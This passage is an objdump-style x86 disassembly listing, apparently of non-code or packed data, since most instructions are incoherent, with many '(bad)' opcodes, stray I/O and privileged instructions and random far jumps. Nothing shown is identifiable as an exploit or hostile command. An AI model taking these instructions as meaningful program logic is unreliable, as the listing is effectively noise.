  415810:	jbe    0x415882
  415812:	sub    al,0xbd
  415814:	xchg   ecx,ebx
  415816:	retf   0xebb8
  415819:	add    eax,0x8d7c2540
  41581e:	mov    ebx,0x1d485949
  415823:	xor    al,0x24
  415825:	ret    0x9d1e
  415828:	mov    ecx,0xd17a57ef
  41582d:	aam    0xe0
  41582f:	ret    
  415830:	cld    
  415831:	cmp    DWORD PTR [eax],ecx
  415833:	aam    0x5c
  415835:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415836:	mov    eax,DWORD PTR [edi-0x4bbb8586]
  41583c:	fld    QWORD PTR [ebp+0x1cb2185e]
  415842:	and    al,0xba
  415844:	adc    al,0xd5
  415846:	mov    eax,esi
  415848:	or     edx,DWORD PTR [edx]
  41584a:	rcr    BYTE PTR [ebp-0x7d452227],0xca
  415851:	sub    dh,BYTE PTR [ecx+0x2f]
  415854:	xchg   esi,eax
  415855:	repnz fsubr st,st(1)
  415858:	lods   eax,DWORD PTR ds:[esi]
  415859:	jno    0x4157e3
  41585b:	ins    BYTE PTR es:[edi],dx
  41585c:	push   ss
  41585d:	popa   
  41585e:	mov    bh,0x40
  415860:	clc    
  415861:	cld    
  415862:	sbb    DWORD PTR [esi-0x28],0x7b86c38a
  415869:	xchg   edx,eax
  41586a:	inc    edx
  41586b:	mov    ds,ecx
  41586d:	xchg   ecx,eax
  41586e:	mov    dh,0x19
  415870:	or     eax,DWORD PTR [edx+0xe]
  415873:	mov    eax,ds:0x1d45985
  415878:	leave  
  415879:	cmp    BYTE PTR [edx-0x70],dl
  41587c:	pop    esp
  41587d:	mov    cl,0x6d
  41587f:	mov    WORD PTR [edx-0x47],ss
  415882:	push   es
  415883:	jno    0x415828
  415885:	loopne 0x41588a
  415887:	add    DWORD PTR [ecx+0x25ec88a4],ecx
  41588d:	in     eax,dx
  41588e:	cwde   
  41588f:	push   esi
  415890:	ins    DWORD PTR es:[edi],dx
  415891:	hlt    
  415892:	lock imul ecx,ebx,0x7a
  415896:	mov    edx,0x6ce081
  41589b:	jmp    0xcc75:0x6d8273a8
  4158a2:	add    esp,DWORD PTR [ebp+0x6e38e293]
  4158a8:	jp     0x415927
  4158aa:	(bad)  
  4158ab:	fidivr WORD PTR [eax-0x7ddb89ce]
  4158b1:	gs das 
  4158b3:	cmc    
  4158b4:	xchg   esi,eax
  4158b5:	mov    eax,ds:0x5d2f7b6f
  4158ba:	mov    esp,0x146a0f8b
  4158bf:	fadd   DWORD PTR [ebx+0x633b7178]
  4158c5:	call   0x9ebe:0x913cba1f
  4158cc:	outs   dx,DWORD PTR ds:[esi]
  4158cd:	pop    edx
  4158ce:	aas    
  4158cf:	call   0x325a:0x4aef2e2c
  4158d6:	sti    
  4158d7:	jnp    0x4158e8
  4158d9:	outs   dx,DWORD PTR ds:[esi]
  4158da:	pop    esi
  4158db:	daa    
  4158dc:	jecxz  0x4158d8
  4158de:	std    
  4158df:	push   0x7a
  4158e1:	mov    edx,0x8efde842
  4158e6:	mov    al,ds:0xd735e45b
  4158eb:	pop    edx
  4158ec:	mov    cl,0xf5
  4158ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158ef:	int    0x4a
  4158f1:	mov    DWORD PTR [ebp+0x54],esi
  4158f4:	push   eax
  4158f5:	sbb    ecx,DWORD PTR [ecx-0x47]
  4158f8:	cmp    edx,edi
  4158fa:	jecxz  0x415976
  4158fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158fe:	fisttp QWORD PTR [ebx-0x3d]
  415901:	jl     0x415972
  415903:	mov    dh,0xb4
  415905:	or     DWORD PTR [esi],ecx
  415907:	jg     0x4158fe
  415909:	sbb    al,BYTE PTR [eax+0x706a67e4]
  41590f:	mov    ds:0x46aab9cf,eax
  415914:	mov    WORD PTR [ebp-0x177786c],gs
  41591a:	pop    ecx
  41591b:	hlt    
  41591c:	shl    dl,1
  41591e:	enter  0xc51e,0xf9
  415922:	xor    dh,BYTE PTR [esp+eax*8+0x780d552b]
  415929:	mov    bh,0x2a
  41592b:	repnz pop ebp
  41592d:	js     0x415985
  41592f:	sar    BYTE PTR [eax],0x99
  415932:	outs   dx,BYTE PTR ds:[esi]
  415933:	out    0xc0,eax
  415935:	fs push 0x3be72bef
  41593b:	adc    DWORD PTR [ebx-0xb],0xbb764926
  415942:	push   0x58f739e5
  415947:	mov    dh,0x70
  415949:	mov    al,ds:0x8324a08c
  41594e:	dec    BYTE PTR [esp+ebp*1+0x7c2d48d3]
  415955:	scas   al,BYTE PTR es:[edi]
  415956:	sbb    BYTE PTR [ebx],0x8f
  415959:	test   al,0x18
  41595b:	out    0x4f,eax
  41595d:	pop    esi
  41595e:	xchg   edi,eax
  41595f:	lock and esp,DWORD PTR [ecx]
  415962:	sar    DWORD PTR [esi+0x595ca5d4],1
  415968:	pop    ds
  415969:	adc    BYTE PTR [edx+ecx*4+0x43],bh
  41596d:	mov    ds:0x21b44e52,eax
  415972:	fisttp DWORD PTR [ebp+ebx*2+0x21]
  415976:	ja     0x415998
  415978:	jnp    0x4159ba
  41597a:	test   eax,0xa3f2b236
  41597f:	xor    ecx,DWORD PTR [ebp+0x625be4a5]
  415985:	sahf   
  415986:	add    eax,ecx
  415988:	dec    edx
  415989:	xor    al,BYTE PTR [edi]
  41598b:	xchg   esi,eax
  41598c:	in     al,0x4f
  41598e:	mov    DWORD PTR [esi],eax
  415990:	pop    edx
  415991:	mov    ch,0xff
  415993:	or     al,0x81
  415995:	adc    eax,0x6f27898a
  41599a:	sub    eax,0x2fb062d1
  41599f:	loope  0x41598f
  4159a1:	test   BYTE PTR [eax],cl
  4159a3:	aad    0x5b
  4159a5:	loope  0x415933
  4159a7:	cmp    eax,0x303c77d3
  4159ac:	fiadd  DWORD PTR [esi-0x630a0e9]
  4159b2:	cmovne edx,DWORD PTR [edi-0x15]
  4159b6:	add    DWORD PTR fs:[edi],eax
  4159b9:	push   cs
  4159ba:	dec    ebp
  4159bb:	mov    al,ds:0x99af22ff
  4159c0:	jae    0x41595f
  4159c2:	add    esi,ebx
  4159c4:	cmp    al,0xbf
  4159c6:	dec    esi
  4159c7:	mov    al,ds:0x85ccf6c4
  4159cc:	stos   DWORD PTR es:[edi],eax
  4159cd:	es popa 
  4159cf:	cmp    DWORD PTR [eax-0x484d5e83],eax
  4159d5:	dec    esp
  4159d6:	inc    ebx
  4159d7:	push   ds
  4159d8:	xchg   ah,ah
  4159da:	shl    DWORD PTR [esi+0x55],cl
  4159dd:	cmp    esi,edi
  4159df:	xlat   BYTE PTR ds:[ebx]
  4159e0:	mov    ah,0x8
  4159e2:	outs   dx,BYTE PTR ds:[esi]
  4159e3:	adc    BYTE PTR [esi-0x66],bl
  4159e6:	lahf   
  4159e7:	std    
  4159e8:	inc    edi
  4159e9:	cdq    
  4159ea:	xchg   edx,eax
  4159eb:	mov    bh,0x61
  4159ed:	cmp    cl,dh
  4159ef:	xor    ah,BYTE PTR [edi+edi*8]
  4159f2:	fidiv  DWORD PTR [ebp-0x7bb86819]
  4159f8:	and    al,0x3e
  4159fa:	fldenv [esi]
  4159fc:	mov    al,ds:0xf0860256
  415a01:	out    0x4f,al
  415a03:	and    DWORD PTR [esi-0x74ffb986],edi
  415a09:	xchg   esi,eax
  415a0a:	into   
  415a0b:	retf   
  415a0c:	jmp    0xfa9a:0x34924769
  415a13:	mov    ebx,0x708333e5
  415a18:	cmp    ecx,DWORD PTR [ebp-0x757bb0c2]
  415a1e:	push   0xffffffee
  415a20:	fisub  WORD PTR [ebx+eiz*1]
  415a23:	jb     0x4159eb
  415a25:	out    dx,eax
  415a26:	inc    esi
  415a27:	out    0x57,al
  415a29:	jmp    0x415a14
  415a2b:	(bad)  
  415a2c:	sbb    dh,BYTE PTR ds:0x6f2d025c
  415a32:	ret    0xcf46
  415a35:	out    dx,al
  415a36:	add    ah,bl
  415a38:	or     ah,BYTE PTR [esi-0x260ef7c8]
  415a3e:	cmp    eax,DWORD PTR [ecx-0x26791cf3]
  415a44:	lahf   
  415a45:	stc    
  415a46:	and    cl,BYTE PTR [edi+0x19]
  415a49:	int3   
  415a4a:	jmp    0xcf69:0xa0e385e7
  415a51:	in     eax,0xb5
  415a53:	ror    BYTE PTR [edi-0x29dc246d],cl
  415a59:	mov    eax,ds:0x4128f52d
  415a5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a5f:	mov    al,ds:0x6d4579d2
  415a64:	dec    esi
  415a65:	(bad)  [eax+0x16]
  415a68:	mov    dh,0x20
  415a6a:	sar    BYTE PTR [edi-0x44],0xaa
  415a6e:	dec    ecx
  415a6f:	rol    BYTE PTR [ecx-0x4a],1
  415a72:	cmp    dh,BYTE PTR [edi]
  415a74:	dec    eax
  415a75:	cmp    eax,0x9ef1b4e4
  415a7a:	and    al,0x94
  415a7c:	cmp    DWORD PTR [eax-0x12178481],ebx
  415a82:	std    
  415a83:	pop    ds
  415a84:	mov    eax,ds:0xf7654916
  415a89:	nop
  415a8a:	(bad)  
  415a8b:	mov    edx,0x3a0690f2
  415a90:	inc    ebp
  415a91:	fdivr  DWORD PTR [ebp+0x6f]
  415a94:	pop    esi
  415a95:	jo     0x415a1f
  415a97:	dec    eax
  415a98:	leave  
  415a99:	and    BYTE PTR [edx+edi*2-0x45],cl
  415a9d:	std    
  415a9e:	or     ah,0x61
  415aa1:	fsub   QWORD PTR [eax-0x5e]
  415aa4:	or     eax,0x99cf8ed
  415aa9:	and    esp,DWORD PTR [ebp+ebx*8-0x20]
  415aad:	mov    esi,0x7a74d259
  415ab2:	outs   dx,DWORD PTR ds:[esi]
  415ab3:	jae    0x415a47
  415ab5:	cmc    
  415ab6:	inc    ebp
  415ab7:	jo     0x415a70
  415ab9:	adc    BYTE PTR [ebx+edx*8+0x1b6325ab],cl
  415ac0:	and    eax,0xf1131658
  415ac5:	mov    esp,0xf430189c
  415aca:	mov    dl,BYTE PTR [eax]
  415acc:	jl     0x415aee
  415ace:	mov    bl,0x94
  415ad0:	je     0x415b1c
  415ad2:	mov    ch,BYTE PTR [esp+ebx*4]
  415ad5:	test   al,0x50
  415ad7:	jp     0x415ac3
  415ad9:	pop    ebp
  415ada:	enter  0x22a0,0xfb
  415ade:	inc    esi
  415adf:	ret    0x24bf
  415ae2:	mov    al,ds:0x11ad37b2
  415ae7:	je     0x415b5a
  415ae9:	xlat   BYTE PTR ds:[ebx]
  415aea:	(bad)  
  415aeb:	mul    DWORD PTR [ebp-0x5ea46782]
  415af1:	inc    esp
  415af2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415af3:	addr16 or ah,bl
  415af6:	dec    eax
  415af7:	sub    ah,BYTE PTR [ecx]
  415af9:	psubusb mm1,QWORD PTR [ebx+0x6]
  415afd:	inc    esi
  415afe:	test   DWORD PTR [ebp-0x39a7f8ea],ebp
  415b04:	imul   esp,DWORD PTR [ecx+0x58b3b9d2],0xcf16f4f7
  415b0e:	adc    cl,BYTE PTR [eax+ecx*4-0x69]
  415b12:	(bad)  [esi+0x50]
  415b15:	push   ebx
  415b16:	das    
  415b17:	test   al,0xf6
  415b19:	adc    esp,DWORD PTR ds:0x92ee0611
  415b1f:	add    DWORD PTR [edi],esp
  415b21:	fdiv   st,st(4)
  415b23:	and    esp,DWORD PTR [edx]
  415b25:	xor    eax,0x9b150a04
  415b2a:	and    bl,BYTE PTR [ebx]
  415b2c:	fldcw  WORD PTR [esi+ebx*2]
  415b2f:	push   edx
  415b30:	adc    al,0x23
  415b32:	hlt    
  415b33:	stc    
  415b34:	sub    al,0xc8
  415b36:	scas   eax,DWORD PTR es:[edi]
  415b37:	(bad)  
  415b38:	fidivr WORD PTR [ecx+0x61]
  415b3b:	add    BYTE PTR [ebp+0x38],0xfb
  415b3f:	push   0xbc47d1bf
  415b44:	out    dx,al
  415b45:	dec    edi
  415b46:	cmovge eax,DWORD PTR [eax]
  415b49:	dec    ecx
  415b4a:	push   edi
  415b4b:	cmp    ecx,DWORD PTR [edi+0x6d3f0eda]
  415b51:	daa    
  415b52:	clc    
  415b53:	pop    esi
  415b54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b55:	cmp    BYTE PTR [esi],0x56
  415b58:	pop    ecx
  415b59:	pop    ds
  415b5a:	mov    ch,bl
  415b5c:	ins    BYTE PTR es:[edi],dx
  415b5d:	dec    edx
  415b5e:	jae    0x415b23
  415b60:	jno    0x415b35
  415b62:	jg     0x415b30
  415b64:	mov    ds:0x4ee84ead,eax
  415b69:	shl    BYTE PTR [edi-0x38],cl
  415b6c:	pop    ebx
  415b6d:	mov    edx,0x3f3a4f6
  415b72:	lods   eax,DWORD PTR ds:[esi]
  415b73:	jno    0x415b17
  415b75:	aad    0x39
  415b77:	rol    BYTE PTR [esi+0x52e30b39],0x18
  415b7e:	xchg   DWORD PTR gs:[ecx+ecx*2],edx
  415b82:	imul   ecx,DWORD PTR [edx],0xffffffa6
  415b85:	lock mov eax,ds:0xbb2a95d3
  415b8b:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  415b8d:	mov    dl,0x4
  415b8f:	cvtps2pd xmm1,QWORD PTR [ebx+0x7c63ef86]
  415b96:	sub    ebx,DWORD PTR [edi+ebp*4+0x531bb80e]
  415b9d:	xor    eax,0x7ab12088
  415ba2:	enter  0xab2c,0x0
  415ba6:	sar    DWORD PTR [ecx-0x17],1
  415ba9:	or     dl,ch
  415bab:	mov    WORD PTR [eax],ss
  415bad:	inc    ebp
  415bae:	imul   BYTE PTR [ecx-0x64]
  415bb1:	repnz stos BYTE PTR es:[edi],al
  415bb3:	push   ebx
  415bb4:	or     cl,dh
  415bb6:	sub    BYTE PTR [edi-0x1976ee4b],cl
  415bbc:	jnp    0x415bf4
  415bbe:	xor    bh,BYTE PTR [edx-0x2e]
  415bc1:	shr    esp,cl
  415bc3:	or     edx,ebx
  415bc5:	es xor al,0xfc
  415bc8:	jle    0x415bbd
  415bca:	enter  0xa739,0x25
  415bce:	lods   al,BYTE PTR ds:[esi]
  415bcf:	mov    eax,ds:0x58d9c4f2
  415bd4:	mov    ecx,0x9814304c
  415bd9:	and    ebp,DWORD PTR [esi-0x114b6268]
  415bdf:	xor    al,0x92
  415be1:	test   bh,bl
  415be3:	cdq    
  415be4:	jno    0x415c5b
  415be6:	dec    ebx
  415be7:	sbb    eax,0xbc971758
  415bec:	outs   dx,BYTE PTR ds:[esi]
  415bed:	shr    dl,1
  415bef:	sub    al,0x1b
  415bf1:	or     DWORD PTR [edx-0x66],0xffffff98
  415bf5:	clc    
  415bf6:	adc    ebx,DWORD PTR ds:0xb03da15b
  415bfc:	cdq    
  415bfd:	outs   dx,BYTE PTR ds:[esi]
  415bfe:	shr    cl,0x31
  415c01:	jecxz  0x415b9f
  415c03:	pop    eax
  415c04:	jmp    DWORD PTR [edi-0x36]
  415c07:	icebp  
  415c08:	mov    esi,0x73e54f3f
  415c0d:	fnstcw WORD PTR [ebp+edi*2+0x25b32912]
  415c14:	ds mov ecx,0xc4767e9f
  415c1a:	mov    eax,0x5aac1be8
  415c1f:	xchg   esi,eax
  415c20:	mov    esp,0xb524546a
  415c25:	sbb    bh,BYTE PTR [eax+ebx*8-0x4a]
  415c29:	xor    DWORD PTR [esi-0x6a],edi
  415c2c:	ret    
  415c2d:	push   0x50b46965
  415c32:	sbb    eax,0xce4c7165
  415c37:	add    edi,DWORD PTR [esi]
  415c39:	push   edi
  415c3a:	arpl   WORD PTR [ecx],bp
  415c3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c3d:	lds    edx,FWORD PTR [edi]
  415c3f:	das    
  415c40:	xchg   DWORD PTR [ebx-0x3d],esi
  415c43:	or     bh,al
  415c45:	ret    0xbbb4
  415c48:	mov    BYTE PTR [eax],ah
  415c4a:	icebp  
  415c4b:	push   esi
  415c4c:	mov    edx,0x4291ce83
  415c51:	imul   edi,eax,0xffffff9e
  415c54:	cmp    BYTE PTR [edi+0x6d],0x30
  415c58:	arpl   WORD PTR [ebx],sp
  415c5a:	div    DWORD PTR [ebx-0x4d3304f]
  415c60:	sbb    eax,0x192aeb01
  415c65:	push   es
  415c66:	outs   dx,DWORD PTR ds:[esi]
  415c67:	xor    cl,ah
  415c69:	cwde   
  415c6a:	mov    ah,BYTE PTR es:[edi-0x38]
  415c6e:	inc    edx
  415c6f:	ds mov edi,0x564f4634
  415c75:	fist   DWORD PTR [eax-0x48ec0574]
  415c7b:	pop    edx
  415c7c:	scas   al,BYTE PTR es:[edi]
  415c7d:	push   eax
  415c7e:	fnsave [ebp+0x4b]
  415c81:	popa   
  415c82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c83:	mov    edi,edi
  415c85:	mov    bl,0xd
  415c87:	mov    gs,WORD PTR [eax-0x83d5426]
  415c8d:	pop    ebx
  415c8e:	cmp    ch,BYTE PTR [ecx-0x9b270ad]
  415c94:	xchg   esi,eax
  415c95:	addr16 ja 0x415cb5
  415c98:	sbb    ebx,DWORD PTR [eax+0xd]
  415c9b:	sub    ecx,0x95b537f6
  415ca1:	pop    ecx
  415ca2:	mov    eax,0xc28ce3fe
  415ca7:	mov    esi,0x7afacb6b
  415cac:	mov    al,0x63
  415cae:	les    ebx,FWORD PTR ds:0x9bc06cd1
  415cb4:	jbe    0x415c62
  415cb6:	stos   DWORD PTR es:[edi],eax
  415cb7:	fsubr  QWORD PTR ds:0x391b4194
  415cbd:	sahf   
  415cbe:	inc    esp
  415cbf:	pop    DWORD PTR [edi-0x31]
  415cc2:	push   esp
  415cc3:	out    0x2f,al
  415cc5:	imul   eax,ebx,0xffffff9b
  415cc8:	sbb    eax,0x9a23a488
  415ccd:	lods   al,BYTE PTR ds:[esi]
  415cce:	mov    eax,ds:0x8839a5ab
  415cd3:	sbb    DWORD PTR [eax-0x1ed8cc8c],esp
  415cd9:	push   cs
  415cda:	xchg   BYTE PTR [edx],cl
  415cdc:	push   edi
  415cdd:	push   ds
  415cde:	scas   al,BYTE PTR es:[edi]
  415cdf:	sub    DWORD PTR [ecx+0x62],esp
  415ce2:	cld    
  415ce3:	add    BYTE PTR ds:0x2d911d1,bh
  415ce9:	ds cmp dl,ah
  415cec:	stos   DWORD PTR es:[edi],eax
  415ced:	xchg   esp,eax
  415cee:	aad    0xf4
  415cf0:	and    al,0x69
  415cf2:	or     eax,0x31d87bb
  415cf7:	fsub   QWORD PTR [ecx-0x5dc05f56]
  415cfd:	jg     0x415cd5
  415cff:	mov    ah,0x1b
  415d01:	inc    edi
  415d02:	and    bh,dh
  415d04:	or     al,0xd5
  415d06:	pop    esi
  415d07:	push   esp
  415d08:	fidiv  WORD PTR [edx+ecx*4-0x78]
  415d0c:	dec    esp
  415d0d:	scas   eax,DWORD PTR es:[edi]
  415d0e:	xchg   edx,eax
  415d0f:	or     DWORD PTR [ecx-0x5a],esp
  415d12:	icebp  
  415d13:	xor    ecx,ecx
  415d15:	inc    ebx
  415d16:	retf   
  415d17:	and    esi,edx
  415d19:	mov    BYTE PTR [edi-0x755cff64],dh
  415d1f:	inc    edx
  415d20:	inc    esi
  415d21:	jnp    0x415d3e
  415d23:	out    dx,eax
  415d24:	cmp    dh,0xe0
  415d27:	stc    
  415d28:	pop    esi
  415d29:	sar    ah,cl
  415d2b:	xor    eax,0x2d5b64d4
  415d30:	sar    DWORD PTR [ecx],1
  415d32:	fldenv [ecx+0x26]
  415d35:	push   ss
  415d36:	xchg   BYTE PTR [ebx+0x626eecfe],cl
  415d3c:	add    BYTE PTR ds:0x7f96c48d,ch
  415d42:	and    eax,0x3bab176a
  415d47:	enter  0x5b3f,0x69
  415d4b:	adc    al,0x44
  415d4d:	iret   
  415d4e:	arpl   WORD PTR ds:0x51b0cb2f,bp
  415d54:	fdivr  DWORD PTR [eax-0x62]
  415d57:	scas   eax,DWORD PTR es:[edi]
  415d58:	int3   
  415d59:	adc    al,0x1
  415d5b:	mov    ecx,0x63dd22fb
  415d60:	cld    
  415d61:	cld    
  415d62:	jnp    0x415d68
  415d64:	xchg   DWORD PTR [edi],ecx
  415d66:	mov    BYTE PTR ds:0xadc299f3,bl
  415d6c:	xchg   esi,eax
  415d6d:	xchg   esp,eax
  415d6e:	mov    bh,BYTE PTR gs:[ebp+0x2b]
  415d72:	push   ds
  415d73:	dec    ebx
  415d74:	cmp    ebp,edx
  415d76:	pusha  
  415d77:	mov    dh,0xcd
  415d79:	or     bh,BYTE PTR [esi-0x3b3f460d]
  415d7f:	cmp    edi,DWORD PTR [esi+0x62]
  415d82:	imul   eax,DWORD PTR [edi+0x62],0x17
  415d86:	pop    edi
  415d87:	loop   0x415dc3
  415d89:	inc    edx
  415d8a:	inc    eax
  415d8b:	les    ecx,FWORD PTR [esi+0x42]
  415d8e:	xor    al,0x12
  415d90:	int3   
  415d91:	jle    0x415db3
  415d93:	jle    0x415dad
  415d95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d96:	aaa    
  415d97:	sar    cl,cl
  415d99:	dec    esi
  415d9a:	jge    0x415d76
  415d9c:	push   0xe
  415d9e:	aas    
  415d9f:	pop    ecx
  415da0:	or     DWORD PTR ds:0x4d813cf0,edx
  415da6:	ror    BYTE PTR [esi],1
  415da8:	or     BYTE PTR [edi+0x55],dl
  415dab:	push   ds
  415dac:	lahf   
  415dad:	cmp    eax,0x8707c2fb
  415db2:	out    dx,eax
  415db3:	lahf   
  415db4:	ins    DWORD PTR es:[edi],dx
  415db5:	jo     0x415e14
  415db7:	aas    
  415db8:	mov    eax,0xba74f504
  415dbd:	add    eax,0x29a10f25
  415dc2:	mov    esp,0xcac83dd1
  415dc7:	sub    dl,cl
  415dc9:	stos   BYTE PTR es:[edi],al
  415dca:	(bad)  
  415dcb:	mov    ds:0xb9492d92,eax
  415dd0:	(bad)  
  415dd1:	sbb    cl,dh
  415dd3:	mov    cl,0x1c
  415dd5:	mov    esp,0xff199c00
  415dda:	jnp    0x415e2d
  415ddc:	cmp    DWORD PTR [esi],ecx
  415dde:	ins    BYTE PTR es:[edi],dx
  415ddf:	jmp    0xe37e:0x6c5205f9
  415de6:	and    DWORD PTR [esi],eax
  415de8:	pop    ebp
  415de9:	daa    
  415dea:	mov    esp,0x14aff0e4
  415def:	pop    esp
  415df0:	add    cl,BYTE PTR [ebx]
  415df2:	enter  0x952b,0x8e
  415df6:	mov    es,WORD PTR ss:[esi-0x667a372f]
  415dfd:	dec    esi
  415dfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dff:	cmc    
  415e00:	jmp    0x3ba7:0x9a0fb73e
  415e07:	retf   
  415e08:	xor    al,0xd
  415e0a:	test   BYTE PTR [esi-0x80],ah
  415e0d:	sbb    esp,DWORD PTR [ecx-0x1733a2d7]
  415e13:	sub    BYTE PTR ds:0x97bd16ee,ch
  415e19:	jbe    0x415db4
  415e1b:	sti    
  415e1c:	cmp    bl,BYTE PTR [edx+0x18]
  415e1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e20:	xor    ecx,DWORD PTR [eax-0x20]
  415e23:	sbb    BYTE PTR [ebx+ebp*4+0x3e],ah
  415e27:	cld    
  415e28:	add    eax,0x3fdae6ab
  415e2d:	gs ss hlt 
  415e30:	daa    
  415e31:	(bad)  
  415e32:	cld    
  415e33:	xchg   edi,eax
  415e34:	add    ebx,eax
  415e36:	mov    ecx,0x91f7d816
  415e3b:	cmp    ebp,ebp
  415e3d:	rcr    BYTE PTR [ecx],0xcc
  415e40:	mov    ebp,DWORD PTR [edx+0x20]
  415e43:	or     al,0xc8
  415e45:	repz push 0x24
  415e48:	sar    ebx,0x67
  415e4b:	jno    0x415e4f
  415e4d:	mov    ds:0x315dea9f,eax
  415e52:	inc    esp
  415e53:	lahf   
  415e54:	mov    ebp,0xc6a3b185
  415e59:	retf   
  415e5a:	add    esi,edx
  415e5c:	push   esp
  415e5d:	mov    bl,0x1b
  415e5f:	imul   cx,di,0x8f53
  415e64:	xor    al,0x95
  415e66:	xor    eax,0x7296bd97
  415e6b:	rcl    DWORD PTR [ecx+eiz*1],1
  415e6e:	pop    ecx
  415e6f:	stc    
  415e70:	clc    
  415e71:	add    bh,BYTE PTR [esi-0x29]
  415e74:	mov    eax,0xdd61d23a
  415e79:	int3   
  415e7a:	ror    DWORD PTR [edi+0x16448258],cl
  415e80:	in     al,0xe4
  415e82:	scas   al,BYTE PTR es:[edi]
  415e83:	fcomp  DWORD PTR [edi-0x5f]
  415e86:	add    BYTE PTR [ebx],dl
  415e88:	ficom  WORD PTR [edi+0x76]
  415e8b:	push   esi
  415e8c:	(bad)  
  415e8d:	aaa    
  415e8e:	pop    es
  415e8f:	out    dx,al
  415e90:	leave  
  415e91:	daa    
  415e92:	leave  
  415e93:	call   0x9fb42c3c
  415e98:	mov    ecx,0x82976db7
  415e9d:	add    BYTE PTR [edi],al
  415e9f:	ror    BYTE PTR [ecx-0x5ab43935],cl
  415ea5:	inc    ecx
  415ea6:	cmp    BYTE PTR [edx-0x377291c8],ah
  415eac:	xchg   ebp,eax
  415ead:	sar    BYTE PTR [eax+0x3a0d58e5],1
  415eb3:	sub    eax,0x2115901a
  415eb8:	push   0xd205981f
  415ebd:	in     eax,dx
  415ebe:	add    eax,0x908956de
  415ec3:	fdivr  st,st(4)
  415ec5:	retf   0x44
  415ec8:	jmp    0x6909:0x3c342ee9
  415ecf:	mov    edx,0xda5992eb
  415ed4:	mov    eax,ds:0xecd04950
  415ed9:	cli    
  415eda:	ja     0x415e93
  415edc:	push   es
  415edd:	into   
  415ede:	es aaa 
  415ee0:	mov    cl,0x11
  415ee2:	test   BYTE PTR [ebx],0xfd
  415ee5:	or     al,0x42
  415ee7:	data16 jmp 0x415e7b
  415eea:	icebp  
  415eeb:	sub    dh,bl
  415eed:	mov    ds,WORD PTR [ebp-0x4b]
  415ef0:	sbb    ebx,ebp
  415ef2:	retf   
  415ef3:	dec    eax
  415ef4:	(bad)  
  415ef5:	push   esp
  415ef6:	popa   
  415ef7:	xchg   ecx,eax
  415ef8:	ins    DWORD PTR es:[edi],dx
  415ef9:	mov    ebx,0xd5eb5b12
  415efe:	or     edi,esp
  415f00:	out    dx,eax
  415f01:	pop    esi
  415f02:	adc    BYTE PTR [ecx-0x60],dl
  415f05:	add    dl,BYTE PTR [edi]
  415f07:	shl    ch,1
  415f09:	jle    0x415f87
  415f0b:	mov    ah,BYTE PTR [edi]
  415f0d:	ins    BYTE PTR es:[edi],dx
  415f0e:	sbb    al,BYTE PTR [esi+0x5d]
  415f11:	mov    ch,0x13
  415f13:	inc    esp
  415f14:	outs   dx,DWORD PTR ds:[esi]
  415f15:	punpckhwd mm1,QWORD PTR [esi-0x25]
  415f19:	rcl    BYTE PTR [edx+0x40fbe104],0xc
  415f20:	mul    DWORD PTR [esi]
  415f22:	rcl    BYTE PTR [edi],1
  415f24:	mov    DWORD PTR ds:0x24a1f236,ebp
  415f2a:	sub    bl,BYTE PTR [eax+0x66]
  415f2d:	adc    dl,dh
  415f2f:	jns    0x415ed5
  415f31:	out    dx,al
  415f32:	lahf   
  415f33:	(bad)  
  415f34:	mov    cl,0xba
  415f36:	mov    DWORD PTR [ecx-0xd974290],ecx
  415f3c:	stc    
  415f3d:	mov    al,ds:0xcfe47641
  415f42:	xchg   edi,eax
  415f43:	int    0x6c
  415f45:	cld    
  415f46:	pop    eax
  415f47:	(bad)  
  415f48:	mov    eax,0xe8fc0aa
  415f4d:	or     bl,BYTE PTR [eax+0x500bac4b]
  415f53:	int    0xb9
  415f55:	fs xchg ecx,eax
  415f57:	std    
  415f58:	add    BYTE PTR [edx-0x6c],al
  415f5b:	retf   
  415f5c:	ror    BYTE PTR [esi+0x2480662f],1
  415f62:	test   DWORD PTR [ecx+0x24],eax
  415f65:	add    al,bh
  415f67:	ja     0x415f83
  415f69:	(bad)  
  415f6a:	jns    0x415f80
  415f6c:	cmp    BYTE PTR [ebx-0x4b],al
  415f6f:	adc    al,0xd7
  415f71:	ja     0x415f1c
  415f73:	stos   BYTE PTR es:[edi],al
  415f74:	inc    ebp
  415f75:	imul   DWORD PTR [eax-0x6dd54b14]
  415f7b:	and    al,0x81
  415f7d:	je     0x415f77
  415f7f:	jne    0x415f59
  415f81:	sub    DWORD PTR [ecx],0xffffff93
  415f84:	mov    esi,0x50635b8
  415f89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f8a:	fiadd  DWORD PTR [esi+0x48b73af2]
  415f90:	xor    eax,0x346915b6
  415f95:	call   0x134c9443
  415f9a:	dec    esi
  415f9b:	scas   al,BYTE PTR es:[edi]
  415f9c:	test   eax,0x909a629
  415fa1:	cld    
  415fa2:	popf   
  415fa3:	sahf   
  415fa4:	mov    eax,ds:0x9a06a37f
  415fa9:	adc    ecx,DWORD PTR [ebx]
  415fab:	out    dx,eax
  415fac:	outs   dx,DWORD PTR ds:[esi]
  415fad:	mov    ds:0x9bfdaacb,eax
  415fb2:	mov    dl,ch
  415fb4:	inc    edx
  415fb5:	test   al,0xb2
  415fb7:	xchg   esi,eax
  415fb8:	fstp   TBYTE PTR [eax]
  415fba:	jl     0x415f9a
  415fbc:	push   ebx
  415fbd:	mov    BYTE PTR [esi-0x22409eab],ch
  415fc3:	retf   0xd7b0
  415fc6:	cmc    
  415fc7:	mov    ch,0x50
  415fc9:	inc    esp
  415fca:	rol    DWORD PTR [esi],cl
  415fcc:	pop    edx
  415fcd:	add    eax,DWORD PTR [eax]
  415fcf:	pop    eax
  415fd0:	add    DWORD PTR [ebx-0x9459d88],0xffffffb4
  415fd7:	cmc    
  415fd8:	fwait
  415fd9:	pop    ss
  415fda:	iret   
  415fdb:	(bad)  
